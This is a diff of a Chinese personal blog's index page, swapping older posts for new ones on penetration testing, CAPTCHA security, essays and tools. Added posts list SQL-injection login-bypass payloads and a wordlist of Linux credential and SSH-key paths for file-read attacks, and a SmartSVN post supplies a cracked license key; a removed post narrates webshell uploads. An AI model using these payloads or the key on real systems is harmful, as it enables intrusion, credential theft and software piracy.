@@ -111,7 +111,7 @@
         
             <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
         
-            <li><a href="Web%E5%AE%89%E5%85%A8.html">Web安全</a></li>
+            <li><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">渗透测试</a></li>
         
             <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
         
@@ -138,16 +138,14 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15572001451538.html">
+                <a class="clearlink" href="15586660103989.html">
                 
-                  <h1>c 语言中变量前面加`*`表示什么？如`*`p</h1>
+                  <h1>使用GET方法传输用户账号密码的危害</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p>*p的意思是：p是一个指针（即指向某一个区域的地址）<br/>
-如果前面加了修饰，就表示为那个类型的指针<br/>
-如：int *p;表示p是一个整型指针，指向一个整型变量的地址</p>
+                        	<p>通过 Get 方式提交数据时，用户名和密码将出现在 URL 上，如果页面可以被缓存（浏览器缓存、cdn 缓存、服务器缓存、中间件日志缓存等）或者其他人可以访问客户这台机器，就可以从历史记录获得该用户的帐号和密码，所以表单提交建议使用 Post 方法。</p>
 
                         
                       </div>
@@ -156,10 +154,10 @@
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/5/7 11:35 上午</span>
+                    <span class="date">2019/5/24 10:46 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E5%BC%80%E5%8F%91.html'>开发</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -173,50 +171,57 @@
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15554899648347.html">
+                <a class="clearlink" href="15586605529996.html">
                 
-                  <h1>CEO、COO、CFO、CIO、CTO、CMO的中文是什么?</h1>
+                  <h1>验证码安全</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<ol>
-<li>CEO：首席执行官</li>
-</ol>
+                        	<p>由于业务迭代频繁，产品线众多...好了不废话了。简单来说就是很多网站的登录界面没有验证码，只有账号密码输入框，这样不安全。</p>
 
-<p>首席执行官（Chief Executive Officer，缩写CEO）是在一个企业中负责日常事务的最高行政官员，主司企业行政事务，又称作司政、行政总裁、总经理或最高执行长。</p>
+<h2 id="toc_0">什么是验证码</h2>
 
-<ol>
-<li>COO：首席运营官</li>
-</ol>
+<p>全自动区分计算机和人类的图灵测试（Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机或人的全自动化程序。</p>
 
-<p>首席运营官（Chief Operating Officer，缩写COO，营运长），就是制定企业长远战略，督导各分公司总经理执行工作的官。主要是负责公司的日常运营，辅助CEO的工作。对CEO负责，负责企业的运营管理。COO在某些公司中同时任职总裁，但他们通常是常务或资深的副总裁。</p>
+<h2 id="toc_1">验证码种类</h2>
 
-<ol>
-<li>CFO：首席财务官</li>
-</ol>
+<p>1、图形验证码<br/>
+2、滑动验证码（比如极验）<br/>
+3、答题验证码<br/>
+4、手机短信/邮箱验证码<br/>
+5、动态口令</p>
 
-<p>首席财务官（Chief<br/>
-Financial<br/>
-Officer）是企业治理结构发展到一个新阶段的必然产物。没有首席财务官的治理结构不是现代意义上完善的治理结构。从这一层面上看，中国构造治理结构也应设立CFO之类的职位。当然，从本质上讲，CFO在现代治理结构中的真正含义，不是其名称的改变、官位的授予，而是其职责权限的取得，在管理中作用的真正发挥。</p>
+<h2 id="toc_2">验证码的作用</h2>
 
-<ol>
-<li>CIO：首席信息官</li>
-</ol>
+<p>人机识别：识别使用对应功能的是人还是机器。<br/>
+防止机器暴力攻击：防止攻击者在短时间内用机器进行批量操作（常见功能场景如：登录）。</p>
 
-<p>首席信息官（Chief Information Officer）中文意思是首席信息官或信息主管，是负责一个公司信息技术和系统所有领域的高级官员。是一个比较新的职位，目前只有在一些全球500强的大企业才设立职位。</p>
+<h2 id="toc_3">验证码工作原理</h2>
 
-<ol>
-<li>CTO：首席技术官</li>
-</ol>
+<p><figure><img src="media/15586605529996/15586616406956.jpg" alt=""/></figure></p>
 
-<p>首席技术官（Chief Technology Officer），即企业内负责技术的最高负责人。这个名称在1980年代从美国开始时兴起于做很多研究的大公司，如General Electric，AT&amp;T，ALCOA，主要责任是将科学研究成果成为盈利产品。</p>
+<h2 id="toc_4">验证码常用场景与作用</h2>
 
-<ol>
-<li>CMO：首席营销官</li>
-</ol>
+<p>登录接口常使用验证码来防御攻击者的撞库攻击<br/>
+注册接口常用验证码来防御批量恶意注册<br/>
+身份认证<br/>
+重要表单提交<br/>
+修改密码<br/>
+支付等功能</p>
 
-<p>首席营销官（Chief Marketing Officer）是指企业中负责市场运营工作的高级管理人员，又称作市场部经理、营销总监。主要负责在企业中对营销思想进行定位；把握市场机会，制定市场营销战略和实施计划，完成企业的营销目标；协调企业内外部关系，对企业市场营销战略计划的执行进行监督和控制；负责企业营销组织建设与激励工作。</p>
+<h2 id="toc_5">验证码使用</h2>
+
+<p>重要接口要加验证码<br/>
+常见的如登录、注册等接口推荐使用滑动验证码；重要的如改密、支付等功能推荐使用手机短信验证码；vpn登录、身份认证等推荐使用动态口令。</p>
+
+<h2 id="toc_6">验证码对抗技术</h2>
+
+<p>1、OCR 识别图形验证码<br/>
+2、机器识别验证码（常见流程：去噪处理-图像二值化-切片处理-文件图片标准化-字符模板识别）<br/>
+3、LTE／4G 伪基站＋GSM 中间人攻击实现手机短信验证码攻击（相关安全事件可见&quot;这下一无所有了&quot;：<a href="http://netsecurity.51cto.com/art/201808/580812.htm%EF%BC%89">http://netsecurity.51cto.com/art/201808/580812.htm）</a><br/>
+4、验证码流程绕过（空验证码、返回包含验证码、验证码固定、验证码前端校验、验证流程有误）<br/>
+5、人工打码平台</p>
 
                         
                       </div>
@@ -225,10 +230,10 @@ Officer）是企业治理结构发展到一个新阶段的必然产物。没有�
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/4/17 16:32 下午</span>
+                    <span class="date">2019/5/24 9:15 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html'>星火流萤</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -242,99 +247,68 @@ Officer）是企业治理结构发展到一个新阶段的必然产物。没有�
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15554000328653.html">
+                <a class="clearlink" href="15585815946395.html">
                 
-                  <h1>最近遇到的一个靶机</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>1、查看 http 流量，后台扫描等进行信息收集，得出其用的是 xxxxcms，然后百度进一步进行信息收集，得出该 cms 存在过 sql 注入、文件包含等漏洞。<br/>
-2、全站测试 sql 注入，发现确实存在注入点<br/>
-3、上 sqlmap 进行扫描，得出管理员账号密码，得出 mysql 为普通用户权限。<br/>
-4、登录网站后台，利用文件包含漏洞获取部分.php 文件信息，对其进行编辑写入小马。（这块之前没怎么玩过，因此稍微花费了一点时间，目的达到了，不过不优雅）<br/>
-5、通过小马传入大马，然后连接大马。<br/>
-6、提权拿 linux 的 root，这里我不太懂，因此正在找资料，希望今晚能搞定提权这事。</p>
-
-<p>提权这块研究一下，搞出来了再写。目前的思路是通过 shell 查看操作系统版本和内核版本，查看已安装的包和程序，看看有没有一直漏洞可以利用。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/4/16 15:33 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15550584590400.html">
-                
-                  <h1>HTTP.sys远程代码执行漏洞</h1>
+                  <h1>万能密码</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>转载自：<a href="http://www.cnvd.org.cn/webinfo/show/3614">http://www.cnvd.org.cn/webinfo/show/3614</a></p>
+<p>内容收集自网络，是否有效并未验证<br/>
+原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
 </blockquote>
 
-<p>4月14日，微软月度例行安全公告披露一个HTTP.sys远程代码执行漏洞（CNVD-2015-02422，对应CVE-2015-1635）,主要威胁到IIS服务器的安全。该漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，攻击者可以在系统帐户的上下文中执行任意代码或提升权限。目前，互联网已经出现了可以使服务器蓝屏的利用代码，不过可导致控制服务器主机的攻击代码还未出现。</p>
+<p>-------asp万能密码 <br/>
+      &#39;or&#39;=&#39;or&#39;</p>
 
-<h2 id="toc_0">这漏洞能干啥</h2>
+<p>--------aspx万能密码<br/>
+   1： &quot;or &quot;a&quot;=&quot;a<br/>
+   2： &#39;)or(&#39;a&#39;=&#39;a<br/>
+   3：or 1=1--<br/>
+   4：&#39;or 1=1--<br/>
+   5：a&#39;or&#39; 1=1--<br/>
+   6： &quot;or 1=1--<br/>
+   7：&#39;or&#39;a&#39;=&#39;a<br/>
+   8： &quot;or&quot;=&quot;a&#39;=&#39;a<br/>
+   9：&#39;or&#39;&#39;=&#39;<br/>
+   10：&#39;or&#39;=&#39;or&#39;<br/>
+   11: 1 or &#39;1&#39;=&#39;1&#39;=1<br/>
+   12: 1 or &#39;1&#39;=&#39;1&#39; or 1=1<br/>
+   13: &#39;OR 1=1%00<br/>
+   14: &quot;or 1=1%00<br/>
+   15: &#39;xor<br/>
+   16: 新型万能登陆密码</p>
 
-<p>IIS 是 windows 主机上的 Web 服务程序，支持 asp、jsp 脚本，应用广泛漏洞众多。IIS服务进程依赖HTTP.sys内核驱动程序文件。漏洞产生的原因是HTTP.sys未能正确分析经特殊设计的HTTP请求所致，通过发送特定构造的HTTP请求包（如：在请求包中相关字段包含类似0xFFFFFFFFFFFFFFFF的大整数值参数），导致整数溢出。成功利用后，攻击者有可能在系统帐户的上下文中执行任意代码，导致拒绝服务或提取权限。目前相关分析表明，漏洞的溢出只限于整数型参数，直接构造可执行系统指令的攻击代码还有一定的难度。</p>
+<p>   用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39; （替换表名admin）<br/>
+   密码 1<br/>
+   Username=-1%cf&#39; union select 1,1,1 as password,1,1,1 %23<br/>
+   Password=1</p>
 
-<p>漏洞评级“高危”，因为被攻击会导致服务器蓝屏死机呀。</p>
+<p>   17..admin&#39; or &#39;a&#39;=&#39;a 密码随便<br/>
+ <br/>
+--------PHP万能密码<br/>
+   &#39;or&#39;=&#39;or&#39;<br/>
+   &#39;or 1=1/*  字符型 GPC是否开都可以使用</p>
 
-<h2 id="toc_1">影响范围</h2>
+<p>   User: something<br/>
+   Pass: &#39; OR &#39;1&#39;=&#39;1</p>
 
-<p>受影响操作系统的IIS服务器版本如下所示：<br/>
-WindowsServer 2012<br/>
-WindowsServer 2012 R2<br/>
-用于基于32位系统：<br/>
-Windows7 SP1<br/>
-Windows8<br/>
-用于基于x64位系统：<br/>
-Windows7 SP1<br/>
-Windows8<br/>
-Windows8.1<br/>
-WindowsServer 2008 R2 SP1<br/>
-用于基于 Itanium 的系统:<br/>
-WindowsServer 2008 R2 SP1</p>
+<p> <br/>
+--------jsp 万能密码<br/>
+   1&#39;or&#39;1&#39;=&#39;1<br/>
+   admin&#39; OR 1=1/*<br/>
+ <br/>
+   用户名：admin    系统存在这个用户的时候 才用得上<br/>
+   <br/>
+   密码：1&#39;or&#39;1&#39;=&#39;1</p>
 
-<h2 id="toc_2">漏洞修复建议</h2>
+<hr/>
 
-<p>补丁：<a href="https://support.microsoft.com/zh-cn/kb/3042553">https://support.microsoft.com/zh-cn/kb/3042553</a><br/>
-装完后要重启才会生效</p>
-
-<p>一些系统管理员在部署微软的Server系统时可能不作为Web服务器使用，但有可能在默认安装了IIS，请相关单位用户注意排查。</p>
-
-<h2 id="toc_3">验证该漏洞注意事项</h2>
-
-<p>网络流传的poc可能导致服务器蓝屏死机，请谨慎验证......别把线上业务搞挂了。</p>
-
-<h2 id="toc_4">参考链接</h2>
-
-<p><a href="https://technet.microsoft.com/zh-CN/library/security/ms15-034.aspx">https://technet.microsoft.com/zh-CN/library/security/ms15-034.aspx</a></p>
-
-<p><a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1635">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1635</a></p>
-
-<p><a href="http://bobao.360.cn/news/detail/1435.html?from=groupmessage&amp;isappinstalled=0">http://bobao.360.cn/news/detail/1435.html?from=groupmessage&amp;isappinstalled=0</a></p>
+<p>作者：xss_01 <br/>
+来源：CSDN <br/>
+原文：<a href="https://blog.csdn.net/u012804180/article/details/51932863">https://blog.csdn.net/u012804180/article/details/51932863</a> <br/>
+版权声明：本文为博主原创文章，转载请附上博文链接！</p>
 
                         
                       </div>
@@ -343,10 +317,10 @@ WindowsServer 2008 R2 SP1</p>
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/4/12 16:40 下午</span>
+                    <span class="date">2019/5/23 11:19 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -360,22 +334,20 @@ WindowsServer 2008 R2 SP1</p>
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15550532565333.html">
+                <a class="clearlink" href="15578813198735.html">
                 
-                  <h1>lonelyor个人技能清单</h1>
+                  <h1>家思</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<blockquote>
-<p>这里记录我已经知道的和计划知道的知识。每个人的路都是不一样的，但结果殊途同归。</p>
+                        	<p>慈母手中线，游子身上衣。临行密密缝，易恐迟迟归。谁言寸草心，报得三春晖。</p>
 
-<p>知识有三个阶段：不知道自己不知道、知道自己知道、知道自己不知道。</p>
+<p>少时不知家可贵，为离故乡，奔波十年方始回。年轻时讨厌家人的管教，只想远离家乡，一个人在外求学四年，虽多遇不平之事，但那时仍觉家无温暖，家人也依然还是喜欢絮絮叨叨。后过三年，每逢春节回家，倍感家人渐渐衰老，虽父亲染发，但依然掩饰不了已经满头白发的事实。不是不爱家，只是说不出口。最怕爱将至而时已晚，最恨情已深而口难开。</p>
 
-<p>智慧是：大智若愚、勤能补拙。</p>
-</blockquote>
+<p>来深方半月时间，然小病却接连不断。上一次生病的记忆还是三年前的了。人总是越脆弱的时候越想家，越孤单的时候越想家人。时光将自己雕琢成了大人，将家人雕琢成了老人，将情越琢越深，将思念越琢越纯。</p>
 
-<p><figure><img src="media/15550532565333/lonelyor%20%E4%B8%AA%E4%BA%BA%E6%8A%80%E8%83%BD%E6%A0%91.png" alt="lonelyor 个人技能树"/><figcaption>lonelyor 个人技能树</figcaption></figure></p>
+<p>不知是因为什么原因，无论心态还是身体都感觉像灌注了水泥，渐渐凝滞。也许是懒惰阻碍了思考，也许是勤奋想得太多，也许是白日梦空白了一切，也许是现实的光芒点缀了头顶的星空。眼前尽是空白，转瞬又光怪陆离，张口不知道在怎样的胡言乱语，缄默才是最好的表达吧。</p>
 
                         
                       </div>
@@ -384,53 +356,311 @@ WindowsServer 2008 R2 SP1</p>
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/4/12 15:14 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html'>星火流萤</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15547243035014.html">
-                
-                  <h1>相见欢·林花谢了春红</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>【作者】李煜 <br/>
-【朝代】五代</p>
-
-<p>林花谢了春红，太匆匆。无奈朝来寒雨，晚来风。<br/>
-胭脂泪，相留醉，几时重。自是人生长恨，水长东。</p>
-
-<blockquote>
-<p>五代是指后梁、后唐、后晋、后汉和后周。<br/>
-前蜀、后蜀、南吴、南唐、吴越、闽、楚、南汉、南平（荆南）、北汉等十余个割据政权被《新五代史》及后世史学家统称十国。<br/>
-五代十国（907年—979年）是中国历史上的一段大分裂时期。这一称谓出自《新五代史》，是对五代（907年—960年）与十国（902年—979年）的合称。</p>
-</blockquote>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/4/8 19:51 下午</span>
+                    <span class="date">2019/5/15 8:48 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html'>风花雪月</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15577346001597.html">
+                
+                  <h1>linux 敏感目录</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>Linux敏感目录，网站存在包含漏洞、任意文件读取漏洞等，权限允许的条件下，放在burp里面批量跑。</p>
+
+<p>/apache/apache/conf/httpd.conf<br/>
+/apache/apache2/conf/httpd.conf<br/>
+/apache/php/php.ini<br/>
+/bin/php.ini<br/>
+/etc/anacrontab<br/>
+/etc/apache/apache.conf<br/>
+/etc/apache/httpd.conf<br/>
+/etc/apache2/apache.conf<br/>
+/etc/apache2/httpd.conf<br/>
+/etc/apache2/sites-available/default<br/>
+/etc/apache2/vhosts.d/00_default_vhost.conf<br/>
+/etc/at.allow<br/>
+/etc/at.deny<br/>
+/etc/cron.allow<br/>
+/etc/cron.deny<br/>
+/etc/crontab<br/>
+/etc/fstab<br/>
+/etc/host.conf<br/>
+/etc/httpd/conf.d/httpd.conf<br/>
+/etc/httpd/conf.d/php.conf<br/>
+/etc/httpd/conf/httpd.conf<br/>
+/etc/httpd/htdocs/index.html<br/>
+/etc/httpd/htdocs/index.php<br/>
+/etc/httpd/logs/access.log<br/>
+/etc/httpd/logs/access_log<br/>
+/etc/httpd/logs/error.log<br/>
+/etc/httpd/logs/error_log<br/>
+/etc/httpd/php.ini<br/>
+/etc/init.d/httpd<br/>
+/etc/init.d/mysql<br/>
+/etc/ld.so.conf<br/>
+/etc/motd<br/>
+/etc/my.cnf<br/>
+/etc/mysql/my.cnf<br/>
+/etc/mysql/my.cnf<br/>
+/etc/network/interfaces<br/>
+/etc/networks<br/>
+/etc/passwd<br/>
+/etc/php.ini<br/>
+/etc/php/apache/php.ini<br/>
+/etc/php/apache2/php.ini<br/>
+/etc/php/cgi/php.ini<br/>
+/etc/php/php.ini<br/>
+/etc/php/php4/php.ini<br/>
+/etc/php4.4/fcgi/php.ini<br/>
+/etc/php4/apache/php.ini<br/>
+/etc/php4/apache2/php.ini<br/>
+/etc/php4/cgi/php.ini<br/>
+/etc/php5/apache/php.ini<br/>
+/etc/php5/apache2/php.ini<br/>
+/etc/php5/cgi/php.ini<br/>
+/etc/phpmyadmin/config.inc.php<br/>
+/etc/resolv.conf<br/>
+/etc/shadow<br/>
+/etc/ssh/sshd_config<br/>
+/etc/ssh/sshd_config<br/>
+/etc/ssh/ssh_config<br/>
+/etc/ssh/ssh_config<br/>
+/etc/ssh/ssh_host_dsa_key<br/>
+/etc/ssh/ssh_host_dsa_key<br/>
+/etc/ssh/ssh_host_dsa_key.pub<br/>
+/etc/ssh/ssh_host_dsa_key.pub<br/>
+/etc/ssh/ssh_host_key<br/>
+/etc/ssh/ssh_host_key<br/>
+/etc/ssh/ssh_host_key.pub<br/>
+/etc/ssh/ssh_host_key.pub<br/>
+/etc/ssh/ssh_host_rsa_key<br/>
+/etc/ssh/ssh_host_rsa_key<br/>
+/etc/ssh/ssh_host_rsa_key.pub<br/>
+/etc/ssh/ssh_host_rsa_key.pub<br/>
+/etc/sysconfig/network<br/>
+/etc/sysconfig/network<br/>
+/home/apache/conf/httpd.conf<br/>
+/home/apache2/conf/httpd.conf<br/>
+/home/bin/stable/apache/php.ini<br/>
+/home2/bin/stable/apache/php.ini<br/>
+/NetServer/bin/stable/apache/php.ini<br/>
+/opt/www/conf/httpd.conf<br/>
+/opt/www/htdocs/index.html<br/>
+/opt/www/htdocs/index.php<br/>
+/opt/xampp/etc/php.ini<br/>
+/PHP/php.ini<br/>
+/php/php.ini<br/>
+/php4/php.ini<br/>
+/php5/php.ini<br/>
+/root/.atftp_history<br/>
+/root/.bashrc<br/>
+/root/.bash_history<br/>
+/root/.mysql_history<br/>
+/root/.nano_history<br/>
+/root/.php_history<br/>
+/root/.profile<br/>
+/root/.ssh/authorized_keys<br/>
+/root/.ssh/identity<br/>
+/root/.ssh/identity.pub<br/>
+/root/.ssh/id_dsa<br/>
+/root/.ssh/id_dsa.pub<br/>
+/root/.ssh/id_rsa<br/>
+/root/.ssh/id_rsa.pub<br/>
+/root/anaconda-ks.cfg<br/>
+/tmp/apache/htdocs/index.html<br/>
+/tmp/apache/htdocs/index.php<br/>
+/usr/lib/php.ini<br/>
+/usr/lib/php/php.ini<br/>
+/usr/local/apache/conf/httpd.conf<br/>
+/usr/local/apache/conf/php.ini<br/>
+/usr/local/apache/htdocs/index.html<br/>
+/usr/local/apache/htdocs/index.php<br/>
+/usr/local/apache/logs/access.log<br/>
+/usr/local/apache/logs/access_log<br/>
+/usr/local/apache/logs/access_logaccess_log.old<br/>
+/usr/local/apache/logs/error.log<br/>
+/usr/local/apache/logs/error_log<br/>
+/usr/local/apache/logs/error_logerror_log.old<br/>
+/usr/local/apache2/conf/httpd.conf<br/>
+/usr/local/apache2/conf/php.ini<br/>
+/usr/local/apache2/htdocs/index.html<br/>
+/usr/local/apache2/htdocs/index.php<br/>
+/usr/local/cpanel/logs<br/>
+/usr/local/cpanel/logs/access_log<br/>
+/usr/local/cpanel/logs/error_log<br/>
+/usr/local/cpanel/logs/license_log<br/>
+/usr/local/cpanel/logs/login_log<br/>
+/usr/local/cpanel/logs/stats_log<br/>
+/usr/local/cpanel/logs/stats_log<br/>
+/usr/local/etc/php.ini<br/>
+/usr/local/httpd/conf/httpd.conf<br/>
+/usr/local/httpd2.2/htdocs/index.html<br/>
+/usr/local/httpd2.2/htdocs/index.php<br/>
+/usr/local/lib/php.ini<br/>
+/usr/local/mysql/bin/mysql<br/>
+/usr/local/mysql/my.cnf<br/>
+/usr/local/php/lib/php.ini<br/>
+/usr/local/php4/lib/php.ini<br/>
+/usr/local/php4/lib/php.ini<br/>
+/usr/local/php4/php.ini<br/>
+/usr/local/php5/etc/php.ini<br/>
+/usr/local/php5/lib/php.ini<br/>
+/usr/local/php5/php5.ini<br/>
+/usr/local/share/examples/php/php.ini<br/>
+/usr/local/share/examples/php4/php.ini<br/>
+/usr/local/tomcat5527/bin/version.sh<br/>
+/usr/local/Zend/etc/php.ini<br/>
+/usr/share/tomcat6/bin/startup.sh<br/>
+/usr/tomcat6/bin/startup.sh<br/>
+/var/apache2/config.inc<br/>
+/var/httpd/conf/httpd.conf<br/>
+/var/httpd/conf/php.ini<br/>
+/var/httpd/conf/php.ini<br/>
+/var/httpd/htdocs/index.html<br/>
+/var/httpd/htdocs/index.php<br/>
+/var/lib/mysql/my.cnf<br/>
+/var/lib/mysql/mysql/user.MYD<br/>
+/var/local/www/conf/httpd.conf<br/>
+/var/local/www/conf/php.ini<br/>
+/var/log/access.log<br/>
+/var/log/access_log<br/>
+/var/log/apache/access.log<br/>
+/var/log/apache/access_log<br/>
+/var/log/apache/error.log<br/>
+/var/log/apache/error_log<br/>
+/var/log/apache2/access.log<br/>
+/var/log/apache2/access_log<br/>
+/var/log/apache2/error.log<br/>
+/var/log/apache2/error_log<br/>
+/var/log/error.log<br/>
+/var/log/error_log<br/>
+/var/log/mysql.log<br/>
+/var/log/mysql/mysql-bin.log<br/>
+/var/log/mysql/mysql-slow.log<br/>
+/var/log/mysql/mysql.log<br/>
+/var/log/mysqlderror.log<br/>
+/var/mail/root<br/>
+/var/mysql.log<br/>
+/var/spool/cron/crontabs/root<br/>
+/var/spool/mail/root<br/>
+/var/www/conf/httpd.conf<br/>
+/var/www/htdocs/index.html<br/>
+/var/www/htdocs/index.php<br/>
+/var/www/index.html<br/>
+/var/www/index.php<br/>
+/var/www/logs/access.log<br/>
+/var/www/logs/access_log<br/>
+/var/www/logs/error.log<br/>
+/var/www/logs/error_log<br/>
+/web/conf/php.ini<br/>
+/www/conf/httpd.conf<br/>
+/www/htdocs/index.html<br/>
+/www/htdocs/index.php<br/>
+/www/php/php.ini<br/>
+/www/php4/php.ini<br/>
+/www/php5/php.ini<br/>
+/xampp/apache/bin/php.ini<br/>
+/xampp/apache/conf/httpd.conf<br/>
+root/.ssh/authorized_keys<br/>
+root/.ssh/identity<br/>
+root/.ssh/identity.pub<br/>
+root/.ssh/id_dsa<br/>
+root/.ssh/id_dsa.pub<br/>
+root/.ssh/id_rsa<br/>
+root/.ssh/id_rsa.pub</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/13 16:3 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15573021402615.html">
+                
+                  <h1>Mac 上的 svnGUI 工具：smartsvn 安装、激活和使用</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>smartsvn 是 mac 上的 svn 客户端，svn 是类似 git 的版本控制工具。</p>
+
+<p>1、下载 smartsvn <a href="http://www.smartsvn.com/download">srmatsvn 官网下载地址</a><br/>
+2、在任意目录下新建文件 smartsvn.license，然后写入以下内容：</p>
+
+<pre class="line-numbers"><code class="language-text">Name=csdn  
+Address=1337 iNViSiBLE Str.  
+Email=admin@csdn.net  
+FreeUpdatesUntil=2099-09-26  
+LicenseCount=1337  
+Addon-xMerge=true  
+Addon-API=true  
+Enterprise=true  
+Key=4kl-&lt;Zqcm-iUF7I-IVmYG-XAyvv-KYRoC-xlgsv-sSBds-VAnP6  
+</code></pre>
+
+<p>3、在安装软件需要导入 license 时选择上述文件或者安装软件后在菜单栏的 help-register 中导入密钥文件即可激活软件。</p>
+
+<p>4、点击菜单栏的project-checkout，添加远程目录，然后输入认证信息，输入本地目录信息，即可挂载远程目录到本地。</p>
+
+<p>5、若认证出错，则点击菜单栏的 SmartSVN-preferences，然后选择 Authentication，使用 delete 删除之前存储的认证信息，然后重新 checkout 即可。</p>
+
+<h1 id="toc_0">Mac 终端下 svn 常用命令</h1>
+
+<p>Mac 可以不用安装 svnGUI 而直接使用命令进行 svn 操作，常见svn 命令如下：<br/>
+svn help 查看命令帮助<br/>
+svn checkout xxx 拉取远程目录到本地<br/>
+svn add file 往版本库中添加新文件</p>
+
+<p>更多常用命令可参考：<a href="https://www.cnblogs.com/luckythan/p/4478706.html">Mac终端下svn常用命令</a></p>
+
+<blockquote>
+<p>通过命令行操作进行认证后，其认证信息存储在 <code>~/.subversion/auth/svn.simple</code>目录下，若认证失败，需要在此目录下情况认证信息后重新进行认证。</p>
+</blockquote>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/8 15:55 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -507,7 +737,7 @@ WindowsServer 2008 R2 SP1</p>
         
             <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
         
-            <a href="Web%E5%AE%89%E5%85%A8.html"><strong>Web安全</strong></a>
+            <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"><strong>渗透测试</strong></a>
         
             <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
         
@@ -528,31 +758,31 @@ WindowsServer 2008 R2 SP1</p>
 	      
 		      
 			      <li class="post">
-			        <a href="15604965103558.html">Docker for Mac 卡在 "is starting"</a>
+			        <a href="15642124072307.html">Mutillidae 遇到的一个奇怪问题</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15602308144902.html">Metasploit 完全使用教程</a>
+			        <a href="15641083818915.html">manjaro更改国内源操作</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15597856399146.html">黑盒测试中的信息收集</a>
